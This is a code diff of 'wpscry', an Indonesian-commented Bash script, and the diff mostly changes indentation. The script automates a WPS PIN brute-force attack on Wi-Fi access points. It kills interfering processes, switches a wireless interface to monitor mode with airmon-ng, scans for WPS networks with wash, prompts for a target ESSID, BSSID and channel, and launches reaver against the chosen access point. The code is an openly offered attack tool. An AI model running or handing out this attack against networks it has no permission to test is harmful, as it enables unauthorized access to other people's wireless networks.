@@ -120,210 +120,210 @@ function selamat_datang(){
 
 # Fungsi untuk mengatur interface yang ingin digunakan.
 function mengatur_interface(){
-    # Memasukkan nama interface yang ingin digunakan.
-    while true; do
-        read -p "Nama interface: " interface
-        # Kondisi jika nama interface tidak kosong.
-        if [[ ! -z "${interface}" ]]; then
-            # Kondisi jika interface ada.
-            if ip link show | grep -q -w "${interface}"; then
-                echo "[+] Interface ${interface} ditemukan."
-                break
-            # Kondisi jika interface tidak ada.
-            else
-                echo "[-] Interface ${interface} tidak ditemukan."
-                continue
-            fi
-        # Kondisi jika nama interface kosong.
-        else
-            echo "[-] Nama interface tidak boleh kosong."
-            continue
-        fi
-    done
+        # Memasukkan nama interface yang ingin digunakan.
+        while true; do
+                read -p "Nama interface: " interface
+                # Kondisi jika nama interface tidak kosong.
+                if [[ ! -z "${interface}" ]]; then
+                        # Kondisi jika interface ada.
+                        if ip link show | grep -q -w "${interface}"; then
+                                echo "[+] Interface ${interface} ditemukan."
+                                break
+                        # Kondisi jika interface tidak ada.
+                        else
+                                echo "[-] Interface ${interface} tidak ditemukan."
+                                continue
+                        fi
+                # Kondisi jika nama interface kosong.
+                else
+                        echo "[-] Nama interface tidak boleh kosong."
+                        continue
+                fi
+        done
 }
 
 # Fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur.
 function mengaktifkan_mode_monitor(){
-    # Kondisi jika interface sudah berada dalam mode monitor.
-    if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
-        echo "[+] Interface ${interface} sudah dalam mode monitor."
-    # Kondisi jika interface belum berada dalam mode monitor.
-    else
-        echo "[-] Interface ${interface} belum dalam mode monitor."
-        echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
-        # Menghentikan proses yang dapat mengganggu mode monitor.
-        airmon-ng check kill >> /dev/null 2>&1
-        # Mengaktifkan mode monitor.
-        airmon-ng start "${interface}" >> /dev/null 2>&1
-        # Kondisi jika nama interface berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
-        if ip link show | grep -q -w  "${interface}mon"; then
-            interface="${interface}mon"
-        # Kondisi jika nama interface tidak berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
+        # Kondisi jika interface sudah berada dalam mode monitor.
+        if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
+                echo "[+] Interface ${interface} sudah dalam mode monitor."
+        # Kondisi jika interface belum berada dalam mode monitor.
         else
-            interface="${interface}"
-        fi
+                echo "[-] Interface ${interface} belum dalam mode monitor."
+                echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
+                # Menghentikan proses yang dapat mengganggu mode monitor.
+                airmon-ng check kill >> /dev/null 2>&1
+                # Mengaktifkan mode monitor.
+                airmon-ng start "${interface}" >> /dev/null 2>&1
+                # Kondisi jika nama interface berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
+                if ip link show | grep -q -w  "${interface}mon"; then
+                        interface="${interface}mon"
+                        # Kondisi jika nama interface tidak berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
+                else
+                        interface="${interface}"
+                fi
 
-        # Kondisi jika interface ada.
-        if ip link show | grep -q -w "${interface}"; then
-            # Kondisi jika interface berhasil diaktifkan ke mode monitor.
-            if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
-                echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
-            # Kondisi jika interface tidak berhasil diaktifkan ke mode monitor.
-            else
-                echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
-                exit 1
-            fi
+                # Kondisi jika interface ada.
+                if ip link show | grep -q -w "${interface}"; then
+                        # Kondisi jika interface berhasil diaktifkan ke mode monitor.
+                        if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
+                                echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
+                        # Kondisi jika interface tidak berhasil diaktifkan ke mode monitor.
+                        else
+                                echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
+                                exit 1
+                        fi
+                fi
         fi
-    fi
 }
 
 # Fungsi untuk memindai jaringan WPS menggunakan alat wash.
 function memindai_jaringan_wps(){
-    echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
-    echo ""
-    # Memindai jaringan WPS.
-    wash -i "${interface}"
+        echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
+        echo ""
+        # Memindai jaringan WPS.
+        wash -i "${interface}"
 }
 
 # Fungsi untuk mengatur ESSID yang ingin diserang.
 function mengatur_essid(){
-    # Memasukkan ESSID yang ingin diserang.
-    while true; do
-        read -p "ESSID: " essid
-        # Kondisi jika ESSID tidak kosong.
-        if [[ ! -z "${essid}" ]]; then
-            # Kondisi jika ESSID 'kembali'.
-            if [[ "${essid}" == "kembali" ]]; then
-                # Memanggil fungsi 'mengatur_interface'.
-                mengatur_interface
-                # Memanggil fungsi 'mengaktifkan_mode_monitor'.
-                mengaktifkan_mode_monitor
-                # Memanggil fungsi 'memindai_jaringan_wps'.
-                memindai_jaringan_wps
-            # Kondisi jika ESSID bukan 'kembali'.
-            else
-                echo "[+] ESSID: '${essid}'"
-                break
-            fi    
-        # Kondisi jika ESSID kosong.
-        else
-            echo "[-] ESSID tidak boleh kosong."
-            continue
-        fi
-    done
+        # Memasukkan ESSID yang ingin diserang.
+        while true; do
+                read -p "ESSID: " essid
+                # Kondisi jika ESSID tidak kosong.
+                if [[ ! -z "${essid}" ]]; then
+                        # Kondisi jika ESSID 'kembali'.
+                        if [[ "${essid}" == "kembali" ]]; then
+                                # Memanggil fungsi 'mengatur_interface'.
+                                mengatur_interface
+                                # Memanggil fungsi 'mengaktifkan_mode_monitor'.
+                                mengaktifkan_mode_monitor
+                                # Memanggil fungsi 'memindai_jaringan_wps'.
+                                memindai_jaringan_wps
+                        # Kondisi jika ESSID bukan 'kembali'.
+                        else
+                                echo "[+] ESSID: '${essid}'"
+                                break
+                        fi    
+                # Kondisi jika ESSID kosong.
+                else
+                        echo "[-] ESSID tidak boleh kosong."
+                        continue
+                fi
+        done
 }
 
 # Fungsi untuk mengatur BSSID yang ingin diserang.
 function mengatur_bssid(){
-    # Memasukkan BSSID yang ingin diserang.
-    while true; do
-        read -p "BSSID: " bssid
-        # Kondisi jika BSSID tidak kosong.
-        if [[ ! -z "${bssid}" ]]; then
-            # Kondisi jika BSSID 'kembali'.
-            if [[ "${bssid}" == "kembali" ]]; then
-                # Memanggil fungsi 'mengatur_essid'.
-                mengatur_essid
-            # Kondisi jika BSSID bukan 'kembali'.
-            else
-                # Kondisi jika BSSID merupakan format yang valid.
-                if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
-                    echo "[+] BSSID: '${bssid}'"
-                    break
-                # Kondisi jika BSSID bukan format yang valid.
+        # Memasukkan BSSID yang ingin diserang.
+        while true; do
+                read -p "BSSID: " bssid
+                # Kondisi jika BSSID tidak kosong.
+                if [[ ! -z "${bssid}" ]]; then
+                        # Kondisi jika BSSID 'kembali'.
+                        if [[ "${bssid}" == "kembali" ]]; then
+                                # Memanggil fungsi 'mengatur_essid'.
+                                mengatur_essid
+                        # Kondisi jika BSSID bukan 'kembali'.
+                        else
+                                # Kondisi jika BSSID merupakan format yang valid.
+                                if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
+                                        echo "[+] BSSID: '${bssid}'"
+                                        break
+                                # Kondisi jika BSSID bukan format yang valid.
+                                else
+                                        echo "[-] BSSID tidak valid."
+                                        continue
+                                fi
+                        fi
+                # Kondisi jika BSSID kosong.
                 else
-                    echo "[-] BSSID tidak valid."
-                    continue
+                        echo "[-] BSSID tidak boleh kosong."
+                        continue
                 fi
-            fi
-        # Kondisi jika BSSID kosong.
-        else
-            echo "[-] BSSID tidak boleh kosong."
-            continue
-        fi
-    done
+        done
 }
 
 # Fungsi untuk mengatur channel dari Access Point yang ingin diserang.
 function mengatur_channel(){
-    # Memasukkan channel yang ingin diserang.
-    while true; do
-        read -p "Channel: " channel
-        # Kondisi jika channel tidak kosong.
-        if [[ ! -z "${channel}" ]]; then
-            # Kondisi jika channel 'kembali'.
-            if [[ "${channel}" == "kembali" ]]; then
-                mengatur_bssid
-            # Kondisi jika channel bukan 'kembali'.
-            else
-                # Kondisi jika channel merupakan angka.
-                if [[ "${channel}" =~ ^[0-9]+$ ]]; then
-                    echo "[+] Channel: '${channel}'"
-                    break
-                # Kondisi jika channel bukan angka.
+        # Memasukkan channel yang ingin diserang.
+        while true; do
+                read -p "Channel: " channel
+                # Kondisi jika channel tidak kosong.
+                if [[ ! -z "${channel}" ]]; then
+                        # Kondisi jika channel 'kembali'.
+                        if [[ "${channel}" == "kembali" ]]; then
+                                mengatur_bssid
+                        # Kondisi jika channel bukan 'kembali'.
+                        else
+                                # Kondisi jika channel merupakan angka.
+                                if [[ "${channel}" =~ ^[0-9]+$ ]]; then
+                                        echo "[+] Channel: '${channel}'"
+                                        break
+                                # Kondisi jika channel bukan angka.
+                                else
+                                        echo "[-] Channel tidak valid."
+                                        continue
+                                fi
+                        fi
+                # Kondisi jika channel kosong.
                 else
-                    echo "[-] Channel tidak valid."
-                    continue
+                        echo "[-] Channel tidak boleh kosong."
+                        continue
                 fi
-            fi
-        # Kondisi jika channel kosong.
-        else
-            echo "[-] Channel tidak boleh kosong."
-            continue
-        fi
-    done
-    read -p "Tekan [Enter] untuk memulai serangan..."
+        done
+        read -p "Tekan [Enter] untuk memulai serangan..."
 }
 
 # Fungsi untuk melakukan serangan terhadap target yang sudah diatur.
 function menjalankan_serangan(){
-    waktu=$(date "+%d-%m-%Y_%H:%M:%S")
-    sesi="${nama_folder}/${essid}_${waktu}.session"
-    reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
-    #
-    # Keterangan:
-    #
-    # -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
-    # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
-    # -b   : Menentukan BSSID (alamat MAC) dari router atau access point yang akan diserang.
-    # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
-    # -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
-    # -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
+        waktu=$(date "+%d-%m-%Y_%H:%M:%S")
+        sesi="${nama_folder}/${essid}_${waktu}.session"
+        reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
+        #
+        # Keterangan:
+        #
+        # -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
+        # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
+        # -b   : Menentukan BSSID (alamat MAC) dari router atau access point yang akan diserang.
+        # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
+        # -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
+        # -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
 }
 
 # Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
 function menonaktifkan_mode_monitor(){
-    airmon-ng stop "${interface}" >> /dev/null 2>&1
-    systemctl restart NetworkManager
-    exit 0
+        airmon-ng stop "${interface}" >> /dev/null 2>&1
+        systemctl restart NetworkManager
+        exit 0
 }
 
 # Fungsi utama wpscry.
 function wpscry(){
-    # Memanggil fungsi cek_root.
-    cek_root
-    # Memanggil fungsi cek_alat.
-    cek_alat
-    # Memanggil fungsi buat_folder.
-    buat_folder
-    # Memanggil fungsi peringatan.
-    peringatan
-    # Memanggil fungsi mengatur_interface.
-    mengatur_interface
-    # Memanggil fungsi mengaktifkan_mode_monitor.
-    mengaktifkan_mode_monitor
-    # Memanggil fungsi memindai_jaringan_wps.
-    memindai_jaringan_wps
-    # Memanggil fungsi mengatur_essid.
-    mengatur_essid
-    # Memanggil fungsi mengatur_bssid.
-    mengatur_bssid
-    # Memanggil fungsi mengatur_channel.
-    mengatur_channel
-    # Memanggil fungsi menjalankan_serangan.
-    menjalankan_serangan
-    # Memanggil fungsi menonaktifkan_mode_monitor.
-    menonaktifkan_mode_monitor
+        # Memanggil fungsi cek_root.
+        cek_root
+        # Memanggil fungsi cek_alat.
+        cek_alat
+        # Memanggil fungsi buat_folder.
+        buat_folder
+        # Memanggil fungsi peringatan.
+        peringatan
+        # Memanggil fungsi mengatur_interface.
+        mengatur_interface
+        # Memanggil fungsi mengaktifkan_mode_monitor.
+        mengaktifkan_mode_monitor
+        # Memanggil fungsi memindai_jaringan_wps.
+        memindai_jaringan_wps
+        # Memanggil fungsi mengatur_essid.
+        mengatur_essid
+        # Memanggil fungsi mengatur_bssid.
+        mengatur_bssid
+        # Memanggil fungsi mengatur_channel.
+        mengatur_channel
+        # Memanggil fungsi menjalankan_serangan.
+        menjalankan_serangan
+        # Memanggil fungsi menonaktifkan_mode_monitor.
+        menonaktifkan_mode_monitor
 }
 
 # Memanggil fungsi wpscry.
